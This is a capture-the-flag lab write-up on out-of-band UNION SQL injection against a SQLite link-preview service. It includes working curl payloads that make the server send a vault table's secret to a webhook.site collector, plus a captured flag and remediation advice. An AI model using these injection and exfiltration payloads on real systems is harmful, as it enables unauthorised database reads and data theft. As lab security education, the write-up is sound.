# Linkly - out-of-band (OOB) SQLi via server-side link fetch (SQLite)

| | |
|---|---|
| **Challenge** | Linkly |
| **Category** | SQLI |
| **Points / Difficulty** | 500 / legendary |
| **Target** | http://sqli7.chal.deti:8036 |
| **Bug** | CWE-89 - UNION SQLi exfiltrated out-of-band through the app's own HTTP fetch |

## Hint
> We fetch the link for you. Whatever it says, we'll ask it. Send it somewhere you can see.

## Recon
- Link-preview service. `POST /add` (`url`,`note`) is **parameterised (safe)**.
- `/l/<id>` preview runs `SELECT url, title, note FROM links WHERE id=<id>` with
  **`id` injected raw** (3 columns; **column 1 = the URL the app then fetches**),
  and the server makes a **live outbound HTTP GET** to that URL on view
  (`Fetched: HTTP 200 in … ms`).
- Another student's stored row confirmed 3 cols + `vault` as target.

## Approach
No data/error/count/timing channel comes back - but the app **talks to the
outside**, so data leaves through the request *it* performs. UNION-inject column 1
to be a URL at a receiver we control, with the secret in the query string:

```
/l/0 UNION SELECT 'http://<receiver>/?d=' || (SELECT secret FROM vault LIMIT 1), 2, 3 --
```
`id=0` → only our row returns → the app fetches our URL → the receiver logs
`?d=flag{...}`.

### Finding a reachable receiver (the real work here)
The intended receiver is a listener on the lab VM, but **the app could not route
to the student subnet**: a live `python3 -m http.server 9900` on
`10.139.0.72` returned **"Couldn't reach that link."**, as did two classmates'
links (`10.139.0.79`, `10.139.0.44`). Meanwhile `https://sqlite.org/` fetched
fine → **the app has outbound internet but no path to `10.139.0.0/24`.** So the
receiver had to be **internet-reachable**: used `https://webhook.site/<token>`.

## Exploitation (URL-encoded: `%3F`=?, `%7C%7C`=||, `%27`=', `--%20-`=comment)
```bash
# 1. enumerate vault columns  ->  webhook ?cols=item,secret
curl -s -o /dev/null "http://sqli7.chal.deti:8036/l/0%20UNION%20SELECT%20%27https://webhook.site/<token>/%3Fcols=%27%7C%7C(SELECT%20group_concat(name)%20FROM%20pragma_table_info(%27vault%27)),2,3--%20-"

# 2. exfil the secret  ->  webhook ?d=flag{...}
curl -s -o /dev/null "http://sqli7.chal.deti:8036/l/0%20UNION%20SELECT%20%27https://webhook.site/<token>/%3Fd=%27%7C%7C(SELECT%20secret%20FROM%20vault%20LIMIT%201),2,3--%20-"
```

## Flag
```
flag{2097ea7ce6a898d731253a860d6fc261}
```
Captured as `GET /<token>/?d=flag{2097ea7ce6a898d731253a860d6fc261}` on the
collector; `vault` columns were `item,secret`.

## For the report
- **Receiver / address:** intended = lab VM IP (`10.139.0.72:9900`,
  `python3 -m http.server`). This environment's app can't reach the student
  subnet (verified: 3 separate `10.139.0.x` links all "Couldn't reach"), but it
  reaches the internet, so the working receiver was `https://webhook.site/<token>`.
- **Captured request:** `GET /<token>/?d=flag{…}` (redacted token).

## Root cause & remediation
- **Cause:** `/l/<id>` concatenates `id` into SQL (CWE-89); a UNION controls the
  `url` column, and the app blindly fetches it → arbitrary-table read exfiltrated
  via server-side request (also an SSRF primitive).
- **Fix:** parameterise the `/l/<id>` query and validate `id` as an integer;
  don't fetch URLs sourced from a query join you don't control; egress-filter the
  fetcher (allowlist, block internal ranges) to limit SSRF/OOB.
